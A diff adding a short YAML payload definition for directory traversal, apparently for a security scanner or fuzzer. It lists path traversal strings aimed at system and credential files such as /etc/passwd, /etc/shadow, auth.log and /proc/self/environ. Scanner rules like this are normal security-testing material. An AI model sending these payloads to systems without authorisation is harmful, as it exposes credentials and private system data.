@@ -1,0 +1,13 @@
+name: "Directory Traversal"
+type: "dir_traversal"
+severity: "high"
+payloads:
+  - "../../../../etc/passwd"
+  - "../../../etc/shadow"
+  - "../../../../../var/log/auth.log"
+  - "../../../../etc/hostname"
+  - "../../../tmp/malicious_file.txt"
+  - "../../../../../../var/www/html/index.php"
+  - "../../../../proc/self/environ"
+  - "../../../etc/hostname"
+  - "../../../etc/hosts"
